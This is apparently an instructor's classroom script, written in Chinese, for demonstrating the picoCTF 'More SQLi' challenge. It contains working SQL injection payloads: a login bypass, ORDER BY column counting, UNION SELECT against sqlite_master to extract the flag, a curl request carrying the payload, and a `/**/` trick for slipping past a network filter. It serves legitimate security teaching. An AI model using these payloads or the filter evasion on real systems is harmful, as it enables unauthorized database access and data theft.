# 台上示範腳本：More SQLi

> 教師用。講義 [handout.md](handout.md) 的示範段壓成一頁：左欄照打，中欄是打完要指給學生看的那一行，右欄是要說的一句。約 20 分鐘。學生自己做的三題（SQL Direct、Irish-Name-Repo 1、Irish-Name-Repo 2）不需要台上帶。
>
> **上台前要自己走一遍的部分**：登入與 302 那一段來自 repo 的實測紀錄；搜尋框的 UNION 那一段（欄位數 3、`sqlite_master`、表名 `more_table`）是 picoCTF 原題的公開解法，還沒有在 CyLab 上實跑。表格裡標「待確認」的值，以你實際看到的為準。

## 開始前（學生進場時做完）

- **用手機網路或教室網路，不要用實驗室網路。** 實驗室網路會把含 `or`／`and` 加比較式的請求掛住不回（見最後一節）；先送一次登入字串，確認不會轉圈。
- 開兩個視窗：`358` 的登入頁停在空白表單；一個終端機備好 curl 那一行（網址和欄位名稱先從登入頁原始碼的 `<form action>`、`<input name>` 對好）。
- F12 → Network，勾 `Preserve log`，面板拉寬到後排看得見 Status、Time。
- 投影講義的「這堂用哪幾題」表：示範一題、實作三題。

## 第一段：登入（步驟一到三）

| 打 | 指著哪一行 | 說一句 |
|---|---|---|
| 帳號 `admin`、密碼 `x`，送出 | 登入失敗的畫面；Network 一筆 `200` | 對照組：正常的錯誤密碼長這樣。 |
| 帳號 `admin`、密碼 `x'`，送出 | 畫面和狀態碼有沒有變 | 單引號是探針。有錯誤訊息就直接確認；沒有的話，網站把錯誤藏起來了，要靠下一步的行為差異。 |
| 白板寫出反推的查詢：`WHERE password = '…' AND username = '…'` | 密碼在前、帳號在後 | 這一題密碼條件寫在前面。看不到原始碼，是從行為猜的；哪個欄位在前，決定從哪裡下手。 |
| 帳號 `admin`、密碼 `1' or true--`，送出 | 跳到搜尋頁 | 沒有密碼，進來了。 |
| 回白板，把密碼填進那句查詢 | `password = '1' or true--' AND username = 'admin'` | 引號把字串提早關掉，`or true` 是我加的條件，`--` 把帳號條件整段截掉。帳號欄填什麼都沒差。 |

## 第二段：flag 在哪（302）

| 打 | 指著哪一行 | 說一句 |
|---|---|---|
| 指著搜尋頁 | 畫面上沒有 flag | 登入成功了，可是什麼都沒有。 |
| 切到 Network，點登入那一筆 | Status `302`，Response 分頁是空的 | 伺服器回的是「去別的網址」，瀏覽器立刻跳走，這個回應的內容它不給你看。 |
| 終端機：`curl -i -s --data-urlencode "username=admin" --data-urlencode "password=1' or true--" <登入網址>` | `HTTP/1.1 302 Found`、`Location:` 那一行，和下面的內容 | curl 不會自己跟著跳。瀏覽器沒給你看的，不代表伺服器沒送。（flag 不唸出來） |

## 第三段：搜尋框的 UNION（步驟四）

| 打（都在搜尋框） | 指著哪一行 | 說一句 |
|---|---|---|
| 隨便一個城市名，或直接按搜尋 | 表格有幾欄 | 結果印成表格，這就是回顯的位置。搜尋框是第二個輸入點。 |
| `' ORDER BY 1--`、`2`、`3`、`4` 逐次送 | 哪個數字開始出錯（待確認：預期 4） | 照第 N 欄排序，沒有那一欄就錯。出錯的前一個數字就是欄位數。 |
| `' UNION SELECT 1,2,3--` | 表格多出一列 `1 2 3` | 欄位數對了才接得上。三個數字出現在哪一欄，那一欄就能拿來顯示資料。 |
| `' UNION SELECT name, sql, null FROM sqlite_master--` | 多出的幾列：表名和建表語句（待確認：預期有 `more_table`，欄位含 `flag`） | `sqlite_master` 是 SQLite 自己的目錄，記著所有表。不用猜表名，問它就好。 |
| `' UNION SELECT flag, null, null FROM more_table--` | 表格裡印出的那一格 | 從登入頁一路走到別的表。四步：探、閉、繞、取。 |

## 收尾

- 問學生：如果後端改成參數化查詢，`1' or true--` 會被當成什麼？等一兩個回答：一個內容很怪的密碼字串，比對失敗。
- 交棒實作：實作一只需要會查詢。實作二、三只用到步驟一到三；兩題的欄位順序和示範題不同，字串直接貼不一定對；實作三恆真式可能過不了，改用截斷。

## 會出狀況的地方

| 狀況 | 處理 |
|---|---|
| 送出後一直轉圈，約 15 秒後逾時 | 網路出口的防護設備把請求掛住了，不是靶機壞掉。換手機網路；換不了就把空白換成 `/**/`，登入密碼改 `1'/**/or/**/true--`。見下一節。 |
| 登入字串送出後失敗 | 逐字元對照：`1` 後面一個引號、`or` 兩側有空白、結尾 `--`。有些環境 `--` 後面要多一個空白。 |
| curl 印出的是登入頁而不是 302 | 網址或欄位名稱不對。回登入頁原始碼對 `<form action>` 和 `<input name>`。 |
| `ORDER BY` 到 4 還沒出錯 | 欄位數比預期多，繼續加；後面 `UNION SELECT` 的欄位數跟著改。 |
| `sqlite_master` 那一步出錯 | 資料庫可能不是 SQLite。先 `' UNION SELECT sqlite_version(), null, null--` 確認；不是的話改口頭說明，不硬做。 |
| `UNION` 那幾步畫面沒變 | 搜尋框的輸入可能不是字串型，試拿掉開頭的引號。 |
| 學生問「為什麼不直接教 sqlmap」 | 工具會自動試這些寫法；先懂機制，才判斷得出工具卡在哪。 |

## 特定網路下的靜默丟包（備援教材）

2026-11-13 在實驗室網路對 Irish-Name-Repo 1 的登入端點實測：`1 or 1=1`、`1 and 1=1` 這類「關鍵字 + 空白 + 比較式」的請求沒有任何回應，約 15 秒後中斷；`1=1`、`1 and 1`、`test'` 都正常。推測是那個網路的出口設備，換手機網路是否就不出現，還沒有對照實測。完整數據在講義最後的備註和 [`lab_network_waf_tarpit_report.md`](../../../lab_network_waf_tarpit_report.md)。

現場真的遇到時，可以順勢當補充：`1=1` 正常、`1 and 1=1` 掛住、空白換成 `/**/` 就過。防護設備擋的是「長得像」，修成因要靠參數化查詢。
